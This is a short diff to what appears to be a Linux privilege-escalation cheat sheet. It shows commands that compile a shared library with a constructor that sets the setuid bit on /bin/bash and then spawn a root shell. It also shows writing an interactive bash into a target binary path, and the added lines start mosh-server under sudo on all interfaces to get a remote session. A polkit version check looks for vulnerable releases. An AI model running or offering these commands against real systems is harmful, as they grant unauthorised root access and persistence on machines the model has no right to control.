@@ -1388,6 +1388,11 @@ TEMPFOLDER=$(mktemp -d); printf %s '/bin/bash -i' > $TEMPFOLDER/$TARGET_BIN; chm
 cd /opt/app/static/assets/images/
 gcc -x c -shared -fPIC -o ./libxcb.so.1 - <<< $'#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n__attribute__((constructor)) void init(){system("chmod u+s /bin/bash");exit(0);}'; bash -p
 
++---------- Mosh-Server / Client ----------+
+sudo /usr/bin/mosh-server new -i 0.0.0.0 -p 164
+MOSH CONNECT 164 llf0eFMPgMD7yZw7zgfkLw
+MOSH_KEY=llf0eFMPgMD7yZw7zgfkLw mosh-client 0.0.0.0 164
+
 +---------- Polkit Version ----------+
 rpm -qa | grep -i polkit | grep -i "0.11[3-9]"
 apt list --installed 2>/dev/null | grep -i policykit
